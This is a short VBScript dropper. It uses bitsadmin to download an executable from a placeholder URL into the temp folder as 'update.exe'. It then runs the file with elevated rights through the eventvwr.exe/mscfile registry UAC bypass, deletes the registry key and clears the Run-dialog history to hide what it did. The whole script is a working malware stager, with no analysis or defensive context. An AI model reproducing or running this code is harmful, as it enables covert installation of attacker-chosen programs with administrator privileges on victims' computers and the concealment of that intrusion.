Sub Main()


	'Userdefined payload settings
	 URL = "REPLACEME" '<- Replace this with a DIRECT link to the binary ending in .exe
	 SAVE_NAME = "update.exe"
	
	'Download File
	CreateObject("WScript.Shell").run("cmd /c bitsadmin /transfer SoftUpdate /download /priority FOREGROUND " + URL + " %temp%/" + SAVE_NAME + ""),0,true
	
	'Write UAC bypass regkey
	CreateObject("WScript.Shell").RegWrite "HKCU\Software\Classes\mscfile\shell\open\command\", CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) +"\" + SAVE_NAME ,"REG_SZ"
	
	'Trigger UAC bypass
	CreateObject("WScript.Shell").Run("eventvwr.exe"),0,true
	
	'Reset regkey 
	GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & "." & "\root\default:StdRegProv").DeleteValue &H80000001,"Software\Classes\mscfile\shell\open\command\",""
	
	'Clear the run-dialog history
	CreateObject("WScript.Shell").Run("cmd.exe /C reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f "),0,true
End Sub 

On Error Resume Next

  Main


  If Err.Number Then

     WScript.Quit 4711

End If